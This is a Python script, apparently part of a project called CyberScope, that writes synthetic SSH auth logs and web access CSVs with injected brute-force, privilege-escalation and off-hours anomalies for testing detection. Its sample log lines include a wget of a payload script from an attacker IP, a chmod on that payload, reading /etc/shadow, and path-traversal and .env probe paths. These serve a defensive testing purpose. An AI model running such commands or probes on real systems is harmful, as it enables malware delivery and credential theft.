"""
CyberScope — Synthetic Log Generator
Generates realistic auth logs with injected anomalies for testing.

Author: Dusty (Akshat Singh Mehrotra)
GitHub: https://github.com/YOUR_USERNAME/cyberscope
License: MIT
© 2026 Dusty — Built by DUSTY | dusty@dustyhive.com
"""

import os
import random
from datetime import datetime, timedelta


# Normal patterns
NORMAL_USERS = ["alice", "bob", "charlie", "diana", "eve", "frank", "grace"]
NORMAL_IPS = [
    "192.168.1.10", "192.168.1.11", "192.168.1.12", "192.168.1.20",
    "192.168.1.25", "192.168.1.30", "10.0.0.5", "10.0.0.10",
]
SERVICES = ["sshd", "sudo", "login", "systemd-logind"]

# Attack patterns
ATTACK_IPS = [
    "45.33.32.156", "203.0.113.50", "198.51.100.23",
    "185.220.101.42", "91.219.236.100", "77.247.181.163",
]
ATTACK_USERS = ["root", "admin", "administrator", "test", "guest", "oracle", "postgres"]


def _fmt_timestamp(dt: datetime) -> str:
    return dt.strftime("%b %d %H:%M:%S")


def generate_normal_entry(ts: datetime) -> str:
    """Generate a normal log entry."""
    user = random.choice(NORMAL_USERS)
    ip = random.choice(NORMAL_IPS)
    hostname = "server01"
    pid = random.randint(1000, 65000)
    
    templates = [
        f"{_fmt_timestamp(ts)} {hostname} sshd[{pid}]: Accepted password for {user} from {ip} port {random.randint(40000, 65535)} ssh2",
        f"{_fmt_timestamp(ts)} {hostname} sshd[{pid}]: Accepted publickey for {user} from {ip} port {random.randint(40000, 65535)} ssh2",
        f"{_fmt_timestamp(ts)} {hostname} systemd-logind[{pid}]: session opened for user {user}",
        f"{_fmt_timestamp(ts)} {hostname} systemd-logind[{pid}]: session closed for user {user}",
        f"{_fmt_timestamp(ts)} {hostname} sudo[{pid}]: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/ls",
    ]
    
    return random.choice(templates)


def generate_brute_force_attack(start_ts: datetime, count: int = 50) -> list:
    """Generate a brute force attack sequence."""
    entries = []
    ip = random.choice(ATTACK_IPS)
    hostname = "server01"
    
    for i in range(count):
        ts = start_ts + timedelta(seconds=random.randint(0, 120))
        user = random.choice(ATTACK_USERS)
        pid = random.randint(1000, 65000)
        entry = f"{_fmt_timestamp(ts)} {hostname} sshd[{pid}]: Failed password for invalid user {user} from {ip} port {random.randint(40000, 65535)} ssh2"
        entries.append((ts, entry))
    
    # Occasionally one succeeds
    if random.random() < 0.3:
        ts = start_ts + timedelta(seconds=random.randint(121, 180))
        pid = random.randint(1000, 65000)
        entry = f"{_fmt_timestamp(ts)} {hostname} sshd[{pid}]: Accepted password for root from {ip} port {random.randint(40000, 65535)} ssh2"
        entries.append((ts, entry))
    
    return entries


def generate_privilege_escalation(ts: datetime) -> list:
    """Generate suspicious privilege escalation entries."""
    entries = []
    ip = random.choice(ATTACK_IPS)
    hostname = "server01"
    pid = random.randint(1000, 65000)
    
    entries.append((
        ts,
        f"{_fmt_timestamp(ts)} {hostname} sshd[{pid}]: Accepted password for root from {ip} port {random.randint(40000, 65535)} ssh2"
    ))
    
    ts2 = ts + timedelta(seconds=5)
    entries.append((
        ts2,
        f"{_fmt_timestamp(ts2)} {hostname} sudo[{pid}]: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://{ip}/payload.sh"
    ))
    
    ts3 = ts + timedelta(seconds=10)
    entries.append((
        ts3,
        f"{_fmt_timestamp(ts3)} {hostname} sudo[{pid}]: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod +x /tmp/payload.sh"
    ))
    
    return entries


def generate_off_hours_access(ts: datetime) -> list:
    """Generate suspicious off-hours access."""
    entries = []
    # Set time to 3 AM
    ts = ts.replace(hour=3, minute=random.randint(0, 59))
    ip = random.choice(ATTACK_IPS)
    hostname = "server01"
    pid = random.randint(1000, 65000)
    
    entries.append((
        ts,
        f"{_fmt_timestamp(ts)} {hostname} sshd[{pid}]: Accepted password for admin from {ip} port {random.randint(40000, 65535)} ssh2"
    ))
    
    ts2 = ts + timedelta(minutes=2)
    entries.append((
        ts2,
        f"{_fmt_timestamp(ts2)} {hostname} sudo[{pid}]: admin : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/bin/cat /etc/shadow"
    ))
    
    return entries


def generate_logs(n_normal=5000, n_attacks=5, output_path="sample_logs/auth.log"):
    """Generate a synthetic auth log file with injected anomalies."""
    
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    
    all_entries = []
    base_date = datetime(2026, 3, 15, 8, 0, 0)
    
    # Generate normal traffic (spread over 24 hours)
    for i in range(n_normal):
        # More events during business hours
        if random.random() < 0.7:
            hour = random.randint(8, 18)
        else:
            hour = random.randint(0, 23)
        
        ts = base_date + timedelta(
            hours=hour - 8,
            minutes=random.randint(0, 59),
            seconds=random.randint(0, 59),
        )
        all_entries.append((ts, generate_normal_entry(ts)))
    
    # Inject attacks
    attack_types = [
        generate_brute_force_attack,
        generate_privilege_escalation,
        generate_off_hours_access,
    ]
    
    for _ in range(n_attacks):
        attack_time = base_date + timedelta(
            hours=random.randint(0, 23),
            minutes=random.randint(0, 59),
        )
        attack_func = random.choice(attack_types)
        attack_entries = attack_func(attack_time)
        all_entries.extend(attack_entries)
    
    # Sort by timestamp
    all_entries.sort(key=lambda x: x[0])
    
    # Write to file
    with open(output_path, "w") as f:
        for _, entry in all_entries:
            f.write(entry + "\n")
    
    total = len(all_entries)
    attack_count = total - n_normal
    
    print(f"✅ Logs generated: {output_path}")
    print(f"   Total entries: {total}")
    print(f"   Normal: {n_normal}")
    print(f"   Attack/Anomalous: ~{attack_count}")
    
    return output_path


# Also generate a CSV version
def generate_csv_logs(n_entries=2000, output_path="sample_logs/web_access.csv"):
    """Generate synthetic web access logs in CSV format."""
    
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    
    import csv
    
    normal_paths = ["/", "/about", "/contact", "/api/users", "/api/data", "/login", "/dashboard"]
    suspicious_paths = ["/admin", "/wp-admin/login.php", "/.env", "/config.json", "/phpmyadmin", "/api/../../etc/passwd"]
    methods = ["GET", "POST", "PUT", "DELETE"]
    
    base_date = datetime(2026, 3, 15, 8, 0, 0)
    
    rows = []
    for i in range(n_entries):
        is_anomaly = random.random() < 0.03  # 3% anomalies
        
        if is_anomaly:
            ip = random.choice(ATTACK_IPS)
            path = random.choice(suspicious_paths)
            status = random.choice([403, 404, 500, 401])
            method = random.choice(["GET", "POST", "DELETE"])
            hour = random.randint(0, 5)
        else:
            ip = random.choice(NORMAL_IPS)
            path = random.choice(normal_paths)
            status = random.choice([200, 200, 200, 200, 301, 304])
            method = random.choice(methods)
            hour = random.randint(8, 18)
        
        ts = base_date + timedelta(
            hours=hour - 8,
            minutes=random.randint(0, 59),
            seconds=random.randint(0, 59),
        )
        
        rows.append({
            "timestamp": ts.strftime("%Y-%m-%d %H:%M:%S"),
            "source_ip": ip,
            "method": method,
            "path": path,
            "status": status,
            "size": random.randint(100, 50000),
            "action": "web_request",
            "result": "failure" if status >= 400 else "success",
        })
    
    rows.sort(key=lambda x: x["timestamp"])
    
    with open(output_path, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=rows[0].keys())
        writer.writeheader()
        writer.writerows(rows)
    
    print(f"✅ CSV logs generated: {output_path}")
    print(f"   Total entries: {len(rows)}")


if __name__ == "__main__":
    generate_logs()
    generate_csv_logs()
